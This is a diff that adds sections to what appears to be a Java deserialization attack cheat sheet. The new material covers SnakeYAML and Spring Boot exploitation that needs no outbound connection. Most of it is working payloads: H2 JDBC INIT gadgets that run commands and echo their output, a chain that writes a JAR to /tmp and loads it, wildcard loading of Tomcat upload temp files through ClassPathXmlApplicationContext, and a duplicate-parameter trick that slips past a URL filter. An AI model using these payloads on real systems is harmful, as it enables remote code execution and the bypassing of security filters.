@@ -136,7 +136,76 @@ exploit.jar/
   </java>
 ```
 
-### 2.4 Detection
+### 2.4 SnakeYAML + H2 Database 不出网利用 (from leavesongs.com)
+
+当目标无法连接外网时，可利用 H2 Database 的 JDBC 注入在本地执行命令：
+
+```yaml
+# 直接调用 JdbcConnection 构造函数
+!!org.h2.jdbc.JdbcConnection
+- jdbc:h2:mem:test
+- MODE: MSSQLServer
+  INIT: |
+    DROP ALIAS IF EXISTS EXEC;
+    CREATE ALIAS EXEC AS $$
+        void exec() throws Exception {
+            Runtime.getRuntime().exec("calc.exe");
+        }
+    $$;
+    CALL EXEC ();
+- a  # username
+- b  # password
+- false  # forbidCreation (绕过默认限制)
+```
+
+**Spring 回显增强版本**:
+```yaml
+!!org.h2.jdbc.JdbcConnection
+- jdbc:h2:mem:test
+- MODE: MSSQLServer
+  INIT: |
+    CREATE ALIAS EXEC AS $$
+        void exec() throws Exception {
+            org.springframework.util.StreamUtils.copy(
+                Runtime.getRuntime().exec("id").getInputStream(),
+                ((org.springframework.web.context.request.ServletRequestAttributes)
+                    org.springframework.web.context.request.RequestContextHolder
+                    .currentRequestAttributes())
+                    .getResponse().getOutputStream()
+            );
+        }
+    $$;
+    CALL EXEC ();
+- a
+- b
+- false
+```
+
+**不出网利用链组合**:
+```yaml
+# 步骤1: 使用 MarshalOutputStream 写入 JAR 文件
+!!sun.rmi.server.MarshalOutputStream [
+  !!java.util.zip.InflaterOutputStream [
+    !!java.io.FileOutputStream [
+      !!java.io.File ["/tmp/exploit.jar"],
+      false
+    ],
+    !!java.util.zip.Inflater {
+      input: !!binary <BASE64_ENCODED_COMPRESSED_JAR>
+    },
+    1048576
+  ]
+]
+
+# 步骤2: 使用 ScriptEngineManager 加载本地 JAR
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["file:///tmp/exploit.jar"]
+  ]]
+]
+```
+
+### 2.5 Detection
 
 ```
 # Indicators in HTTP traffic:
@@ -155,7 +224,75 @@ exploit.jar/
 
 ---
 
-## 3. HESSIAN / KRYO / AVRO DESERIALIZATION
+## 3. SPRING BOOT XML BEANS 不出网利用 (from leavesongs.com)
+
+> 针对 `ClassPathXmlApplicationContext` 和 `FileSystemXmlApplicationContext` 的受限环境利用
+
+### 3.1 通配符加载临时文件
+
+当目标无法连接外网加载远程 XML 时，可利用 Tomcat 的临时文件机制：
+
+**原理**: Tomcat 处理 multipart/form-data 时，将每个块保存在临时目录 `work/Tomcat/localhost/ROOT/` 下，文件名为 `upload_<uuid>_<seq>.tmp`
+
+**利用步骤**:
+1. 发送包含恶意 XML 内容的 multipart 请求
+2. 使用通配符 `*.tmp` 加载临时文件
+
+```bash
+# Multipart 请求（包含 Spring XML payload）
+curl -X POST http://target:8080/upload \
+  -F "file=@spring-exploit.xml" \
+  -F "data=irrelevant"
+
+# 利用通配符加载
+!!org.springframework.context.support.ClassPathXmlApplicationContext [
+  "file:/tmp/tomcat.*/work/Tomcat/*/upload_*.tmp"
+]
+```
+
+### 3.2 环境变量适配不同部署
+
+Spring 支持 `${VAR}` 语法解析环境变量，适配不同 Tomcat 部署方式：
+
+```yaml
+# 传统 Tomcat 部署（有安装目录）
+!!org.springframework.context.support.ClassPathXmlApplicationContext [
+  "file:${catalina.home}/work/Catalina/localhost/ROOT/*.tmp"
+]
+
+# SpringBoot 嵌入式 Tomcat
+!!org.springframework.context.support.ClassPathXmlApplicationContext [
+  "file:${java.io.tmpdir}/tomcat.*/work/Tomcat/*/upload_*.tmp"
+]
+```
+
+### 3.3 分片参数绕过 URL 检测
+
+当 Filter 检测 `jdbc:postgresql` 和 `socketFactory` 同时出现时：
+
+```http
+POST /jdbc?url=jdbc:postgresql://1:2/?a=&url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file:/${catalina.home}/**/*.tmp
+```
+
+**处理差异**:
+- Filter: `getParameter("url")` → 仅获取第一个参数
+- Spring: `String url` → 拼接所有同名参数（逗号分隔）
+
+### 3.4 Ascii-JAR 技巧（非预期解）
+
+利用 `loggerFile` 写入带脏字符的文件，再打包成 JAR 绕过：
+
+```
+jar:/path/to/payload.zip!/META-INF/resources/poc.xml
+```
+
+工具链:
+- [ascii-jar](https://github.com/c0ny1/ascii-jar): 生成纯 ASCII JAR
+- [PaddingZip](https://github.com/phith0n/PaddingZip): 修复脏字符前后的 ZIP 结构
+
+---
+
+## 4. HESSIAN / KRYO / AVRO DESERIALIZATION
 
 ### 3.1 Hessian
 
